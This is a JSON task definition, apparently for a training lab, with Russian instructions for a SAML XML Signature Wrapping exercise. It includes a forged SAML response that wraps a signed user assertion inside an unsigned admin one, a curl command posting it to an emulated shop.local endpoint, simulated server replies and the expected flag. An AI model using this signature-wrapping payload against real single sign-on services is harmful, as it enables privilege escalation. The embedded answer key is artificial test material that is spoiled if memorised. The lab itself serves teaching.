@@ -1,0 +1,45 @@
+{
+  "id": "web-saml-deep",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{s4ml_xsw_s1gn4tur3_wr4pp3d}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: SAML XML Signature Wrapping (XSW)\n\nПриложение (SP) проверяет подпись assertion, но читает НЕ тот узел, что\nподписан. В `evil_saml.xml` внешний assertion содержит `role=admin`, а\nвнутрь вложен подлинный (подписанный, `role=user`).\n\n1. Посмотри исходный ответ:\n   cat saml_b64.txt | base64 -d\n2. Закодируй подготовленный XSW-ответ:\n   base64 -w0 evil_saml.xml > evil.b64\n3. Отправь его на ACS (сервер проверит подпись на внутреннем assertion,\n   а роль прочитает из внешнего):\n   curl -s -X POST 'https://shop.local/saml/acs' --data-binary @evil.b64\n4. В ответе — флаг. Запиши последнюю строку в `found.txt` и набери `check`.\n"
+    },
+    {
+      "path": "/home/student/task/saml_b64.txt",
+      "text": "PHNhbWxwOlJlc3BvbnNlPjxzYW1sOkFzc2VydGlvbiBJRD0iYTEiPjxzYW1sOlN1YmplY3Q+PHNhbWw6TmFtZUlEPmFsaWNlQGNvcnAuZXhhbXBsZTwvc2FtbDpOYW1lSUQ+PC9zYW1sOlN1YmplY3Q+PHNhbWw6QXR0cmlidXRlU3RhdGVtZW50PjxzYW1sOkF0dHJpYnV0ZSBOYW1lPSJyb2xlIj48c2FtbDpBdHRyaWJ1dGVWYWx1ZT51c2VyPC9zYW1sOkF0dHJpYnV0ZVZhbHVlPjwvc2FtbDpBdHRyaWJ1dGU+PC9zYW1sOkF0dHJpYnV0ZVN0YXRlbWVudD48ZHM6U2lnbmF0dXJlPlZBTElEX1NJRzwvZHM6U2lnbmF0dXJlPjwvc2FtbDpBc3NlcnRpb24+PC9zYW1scDpSZXNwb25zZT4=\n"
+    },
+    {
+      "path": "/home/student/task/evil_saml.xml",
+      "text": "<samlp:Response>\n  <saml:Assertion ID=\"evil\">\n    <saml:Subject><saml:NameID>admin@corp.example</saml:NameID></saml:Subject>\n    <saml:AttributeStatement>\n      <saml:Attribute Name=\"role\"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>\n    </saml:AttributeStatement>\n    <saml:Assertion ID=\"a1\">\n      <ds:Signature>VALID_SIG</ds:Signature>\n    </saml:Assertion>\n  </saml:Assertion>\n</samlp:Response>\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/saml/acs)",
+      "cases": [
+        {
+          "match": "evil\\.b64",
+          "example": "-s -X POST 'https://shop.local/saml/acs' --data-binary @evil.b64",
+          "output": "{\"status\":\"authenticated\",\"subject\":\"admin@corp.example\",\"role\":\"admin\",\"signature\":\"valid\",\"note\":\"signature checked on inner assertion, role read from outer\",\"flag\":\"nto{s4ml_xsw_s1gn4tur3_wr4pp3d}\"}\n"
+        },
+        {
+          "match": "saml/acs",
+          "example": "-s -X POST 'https://shop.local/saml/acs' --data-binary @orig.b64",
+          "output": "HTTP/1.1 403 Forbidden\n\n{\"error\":\"assertion signature invalid or not trusted\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только https://shop.local/saml/acs.\n"
+    }
+  }
+}
